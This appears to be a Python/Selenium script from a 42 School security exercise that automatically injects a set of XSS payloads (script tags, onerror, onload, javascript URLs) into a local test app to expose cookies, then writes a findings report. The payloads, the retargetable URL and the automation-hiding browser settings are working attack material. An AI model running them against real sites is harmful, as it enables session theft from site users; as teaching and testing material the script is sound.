#!/usr/bin/env python3
"""
XSS Vulnerability Automated Exploitation Script
Cybersecurity 0x0 - 42 School Project

This script automatically tests various XSS payloads against the vulnerable application
running at http://localhost:8000/ and demonstrates the presence of the vulnerability.

Author: dande-je
Date: 06/08/2025
"""

import requests
import time
import json
import sys
from urllib.parse import urlencode
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, WebDriverException
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('xss_exploit.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class XSSExploitTester:
    """
    Professional XSS vulnerability testing class following OWASP guidelines
    """

    def __init__(self, target_url="http://localhost:8000/", headless=True):
        self.target_url = target_url
        self.session = requests.Session()
        self.driver = None
        self.headless = headless
        self.results = {
            "target": target_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities_found": [],
            "payloads_tested": [],
            "success_count": 0,
            "total_tests": 0
        }

        # Professional XSS payload collection
        self.payloads = {
            "basic_alert": {
                "payload": "alert(document.cookie)",
                "description": "Basic JavaScript alert showing cookies",
                "type": "Direct Script Injection",
                "expected_result": "Alert popup with cookie content"
            },
            "html_script_tag": {
                "payload": "<script>alert(document.cookie)</script>",
                "description": "HTML script tag injection",
                "type": "HTML Injection",
                "expected_result": "Script execution via innerHTML"
            },
            "img_onerror": {
                "payload": "<img src=x onerror=alert(document.cookie)>",
                "description": "Image error handler exploitation",
                "type": "Event Handler Injection",
                "expected_result": "Immediate script execution on image load error"
            },
            "svg_onload": {
                "payload": "<svg onload=alert(document.cookie)>",
                "description": "SVG onload event exploitation",
                "type": "Event Handler Injection",
                "expected_result": "Script execution on SVG element load"
            },
            "dom_manipulation": {
                "payload": "document.getElementById('cookieOutput').innerHTML='<h3 style=\"color:red;\">XSS SUCCESS: '+document.cookie+'</h3>'",
                "description": "DOM manipulation to display cookies",
                "type": "DOM-based XSS",
                "expected_result": "Cookie display in specific DOM element"
            },
            "input_autofocus": {
                "payload": "<input onfocus=alert(document.cookie) autofocus>",
                "description": "Input field with autofocus event handler",
                "type": "Event Handler Injection",
                "expected_result": "Automatic execution on element focus"
            },
            "iframe_javascript": {
                "payload": "<iframe src=javascript:alert(document.cookie)>",
                "description": "Iframe with JavaScript URL",
                "type": "URL-based Injection",
                "expected_result": "Script execution within iframe context"
            },
            "encoded_payload": {
                "payload": "%3Cscript%3Ealert(document.cookie)%3C/script%3E",
                "description": "URL-encoded script tag",
                "type": "Encoding Bypass",
                "expected_result": "Script execution after URL decoding"
            }
        }

    def setup_webdriver(self):
        """Initialize Chrome WebDriver with security testing configurations"""
        try:
            chrome_options = Options()
            if self.headless:
                chrome_options.add_argument("--headless")

            # Security testing optimizations
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-web-security")
            chrome_options.add_argument("--allow-running-insecure-content")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)

            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

            logging.info("‚úÖ WebDriver initialized successfully")
            return True

        except Exception as e:
            logging.error(f"‚ùå Failed to initialize WebDriver: {str(e)}")
            return False

    def check_target_availability(self):
        """Verify that the target application is running and accessible"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            if response.status_code == 200:
                logging.info(f"‚úÖ Target application is accessible: {self.target_url}")
                return True
            else:
                logging.error(f"‚ùå Target returned status code: {response.status_code}")
                return False

        except requests.exceptions.RequestException as e:
            logging.error(f"‚ùå Cannot reach target application: {str(e)}")
            logging.error("üîß Make sure to run './start.sh' in the project directory")
            return False

    def test_payload(self, payload_name, payload_data):
        """Test individual XSS payload with comprehensive validation"""
        logging.info(f"üß™ Testing payload: {payload_name}")
        logging.info(f"üìù Description: {payload_data['description']}")

        self.results["total_tests"] += 1

        try:
            # Navigate to target application
            self.driver.get(self.target_url)

            # Wait for page to load completely
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.ID, "inputText"))
            )

            # Find input field and submit button
            input_field = self.driver.find_element(By.ID, "inputText")
            submit_button = self.driver.find_element(By.XPATH, "//button[@onclick='displayText()']")

            # Clear any existing content
            input_field.clear()

            # Input the payload
            input_field.send_keys(payload_data["payload"])

            # Set up alert handling for payloads that trigger alerts
            if "alert" in payload_data["payload"]:
                # Submit and wait for potential alert
                submit_button.click()

                try:
                    # Wait for alert to appear
                    WebDriverWait(self.driver, 5).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()

                    # Check if alert contains cookie information
                    if "ftCookies=If_You_See_Me_Its_Win" in alert_text:
                        logging.info(f"‚úÖ SUCCESS: Alert displayed cookie content")
                        self.record_successful_exploit(payload_name, payload_data, alert_text)
                        return True
                    else:
                        logging.warning(f"‚ö†Ô∏è  Alert appeared but without expected cookie content: {alert_text}")

                except TimeoutException:
                    logging.warning(f"‚ö†Ô∏è  No alert appeared for payload: {payload_name}")

            else:
                # For non-alert payloads, check DOM manipulation
                submit_button.click()
                time.sleep(2)  # Allow time for DOM manipulation

                # Check for DOM changes indicating successful exploitation
                if "cookieOutput" in payload_data["payload"]:
                    try:
                        cookie_output = self.driver.find_element(By.ID, "cookieOutput")
                        if cookie_output.text and "ftCookies" in cookie_output.text:
                            logging.info(f"‚úÖ SUCCESS: DOM manipulation successful")
                            self.record_successful_exploit(payload_name, payload_data, cookie_output.text)
                            return True
                    except:
                        pass

                # Check page source for injected content
                page_source = self.driver.page_source
                if payload_data["payload"] in page_source or "ftCookies" in page_source:
                    logging.info(f"‚úÖ SUCCESS: Payload reflected in page")
                    self.record_successful_exploit(payload_name, payload_data, "Payload reflected")
                    return True

            logging.warning(f"‚ùå FAILED: Payload did not execute successfully")
            return False

        except Exception as e:
            logging.error(f"‚ùå ERROR testing payload {payload_name}: {str(e)}")
            return False

    def record_successful_exploit(self, payload_name, payload_data, evidence):
        """Record successful exploitation with detailed information"""
        exploit_record = {
            "payload_name": payload_name,
            "payload": payload_data["payload"],
            "type": payload_data["type"],
            "description": payload_data["description"],
            "evidence": evidence,
            "timestamp": time.strftime("%H:%M:%S"),
            "success": True
        }

        self.results["vulnerabilities_found"].append(exploit_record)
        self.results["success_count"] += 1

    def generate_comprehensive_report(self):
        """Generate detailed security assessment report"""
        report_lines = []
        report_lines.append("=" * 80)
        report_lines.append("XSS VULNERABILITY AUTOMATED EXPLOITATION REPORT")
        report_lines.append("=" * 80)
        report_lines.append(f"Target: {self.results['target']}")
        report_lines.append(f"Timestamp: {self.results['timestamp']}")
        report_lines.append(f"Total Tests: {self.results['total_tests']}")
        report_lines.append(f"Successful Exploits: {self.results['success_count']}")
        report_lines.append(f"Success Rate: {(self.results['success_count']/self.results['total_tests']*100):.1f}%")
        report_lines.append("")

        if self.results["vulnerabilities_found"]:
            report_lines.append("SUCCESSFUL EXPLOITATIONS:")
            report_lines.append("-" * 50)

            for i, vuln in enumerate(self.results["vulnerabilities_found"], 1):
                report_lines.append(f"{i}. {vuln['payload_name'].upper()}")
                report_lines.append(f"   Type: {vuln['type']}")
                report_lines.append(f"   Payload: {vuln['payload']}")
                report_lines.append(f"   Evidence: {vuln['evidence']}")
                report_lines.append(f"   Time: {vuln['timestamp']}")
                report_lines.append("")

        report_lines.append("SECURITY ASSESSMENT:")
        report_lines.append("-" * 50)
        if self.results["success_count"] > 0:
            report_lines.append("‚ùå CRITICAL VULNERABILITY CONFIRMED")
            report_lines.append("üîç The application is vulnerable to XSS attacks")
            report_lines.append("‚ö†Ô∏è  Multiple attack vectors are exploitable")
            report_lines.append("üõ†Ô∏è  Immediate remediation required")
        else:
            report_lines.append("‚úÖ No XSS vulnerabilities detected")

        report_lines.append("")
        report_lines.append("RECOMMENDATIONS:")
        report_lines.append("- Implement input validation and sanitization")
        report_lines.append("- Use Content Security Policy (CSP)")
        report_lines.append("- Encode output data properly")
        report_lines.append("- Remove dangerous DOM manipulation patterns")

        return "\n".join(report_lines)

    def save_results(self):
        """Save detailed results to JSON and text files"""
        # Save JSON results
        with open("xss_exploit_results.json", "w") as f:
            json.dump(self.results, f, indent=2)

        # Save readable report
        with open("xss_exploit_report.txt", "w") as f:
            f.write(self.generate_comprehensive_report())

        logging.info("üìä Results saved to xss_exploit_results.json and xss_exploit_report.txt")

    def run_full_test_suite(self):
        """Execute complete XSS vulnerability assessment"""
        print("\nüöÄ Starting XSS Vulnerability Automated Exploitation")
        print("=" * 60)

        # Step 1: Check target availability
        if not self.check_target_availability():
            print("‚ùå Cannot proceed - target application not accessible")
            print("üí° Please run './start.sh' to start the application")
            return False

        # Step 2: Setup WebDriver
        if not self.setup_webdriver():
            print("‚ùå Cannot proceed - WebDriver initialization failed")
            print("üí° Please install ChromeDriver: https://chromedriver.chromium.org/")
            return False

        try:
            # Step 3: Execute all payload tests
            print(f"\nüß™ Testing {len(self.payloads)} different XSS payloads...")
            print("-" * 60)

            for payload_name, payload_data in self.payloads.items():
                success = self.test_payload(payload_name, payload_data)
                time.sleep(1)  # Brief delay between tests

            # Step 4: Generate and display results
            print("\nüìä EXPLOITATION SUMMARY")
            print("-" * 60)
            report = self.generate_comprehensive_report()
            print(report)

            # Step 5: Save results
            self.save_results()

            return self.results["success_count"] > 0

        except KeyboardInterrupt:
            logging.info("üõë Test interrupted by user")
            return False

        finally:
            if self.driver:
                self.driver.quit()
                logging.info("üîå WebDriver closed")

def main():
    """Main execution function with command line argument support"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Automated XSS Vulnerability Exploitation Tool - 42 School Cybersecurity Project"
    )
    parser.add_argument(
        "--target", 
        default="http://localhost:8000/",
        help="Target URL (default: http://localhost:8000/)"
    )
    parser.add_argument(
        "--headless", 
        action="store_true",
        help="Run browser in headless mode (default: False for demonstration)"
    )
    parser.add_argument(
        "--verbose", 
        action="store_true",
        help="Enable verbose logging"
    )

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Initialize and run the XSS tester
    tester = XSSExploitTester(target_url=args.target, headless=args.headless)

    print("üîí XSS Vulnerability Automated Exploitation Tool")
    print("üìö 42 School - Cybersecurity 0x0 Project")
    print("‚öñÔ∏è  For Educational and Authorized Testing Only")

    success = tester.run_full_test_suite()

    if success:
        print("\n‚úÖ Vulnerability successfully demonstrated!")
        print("üìã Check xss_exploit_report.txt for detailed findings")
        sys.exit(0)
    else:
        print("\n‚ùå No vulnerabilities found or test failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
